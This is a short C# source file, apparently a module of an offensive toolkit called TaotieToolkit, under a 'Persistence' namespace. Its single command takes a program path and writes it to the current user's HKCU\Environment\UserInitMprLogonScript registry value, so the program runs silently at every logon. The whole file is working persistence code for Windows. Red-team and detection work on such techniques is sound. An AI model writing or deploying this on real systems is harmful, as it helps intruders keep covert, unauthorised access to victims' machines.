using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TaotieToolkit.config;

namespace TaotieToolkit.modules.Persistence
{
    internal class UserInitMprLogonScriptKey : ICommand, ICommandMarker
    {
        public string Name => "UserInitMprLogonScriptKey";
        public string Description => "在当前用户的注册表中创建一个键，用于在登录时运行脚本。";
        public void Execute(string[] args) {
            if (args.Length != 1) {
                Console.WriteLine("\t[-] Parameter error");
                return;
            }
            string binpath = args[0];
            RegistryKey regkey;
            regkey = Registry.CurrentUser.CreateSubKey("Environment");
            regkey.SetValue("UserInitMprLogonScript", binpath );
            regkey.Close();
            Console.WriteLine("[+] Created User HKCU:\\Environment key UserInitMprLogonScript and set to {0}", binpath);
        }

    }
}
